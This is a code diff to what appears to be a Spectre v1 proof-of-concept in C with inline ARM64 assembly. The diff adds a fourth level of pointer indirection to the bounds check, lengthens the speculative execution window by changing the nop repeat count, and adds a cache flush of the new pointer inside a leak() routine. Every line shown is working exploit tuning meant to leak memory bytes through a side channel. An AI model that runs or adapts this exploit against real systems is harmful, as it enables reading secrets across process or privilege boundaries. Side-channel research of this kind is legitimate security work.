@@ -18,6 +18,8 @@ unsigned char aligned_buffer1[4096];
 unsigned int **index_p2 = &index_p1;
 unsigned char aligned_buffer2[4096];
 unsigned int ***index_p3 = &index_p2;
+unsigned char aligned_buffer3[4096];
+unsigned int ****index_p4 = &index_p3;
 
 volatile uint8_t pick = 0; 
 uint64_t counter = 0;
@@ -29,10 +31,10 @@ void spectre_v1( size_t index) {
 		"mov x11, 2\n"
         :: [counter] "m" (counter)
     );
-	if (index < size)
+	if (index < *index_p1)
 	{	
 		asm volatile(
-			".rept 1125\n"                 
+			".rept 1134\n"                 
 		//	"adds x10, x10, x11\n"          //execution window 1135
 			"nop\n"							//execution window 1135
 		//	"sdiv x10, x10, x11\n"			//execution window 10
@@ -84,6 +86,7 @@ void leak(size_t target, uint8_t *byte) {
 			cacheflush(&index_p1);
 			cacheflush(&index_p2);
 			cacheflush(&index_p3);
+			cacheflush(&index_p4);
 			for(int z = 0; z < 100; z++){
 			}
 
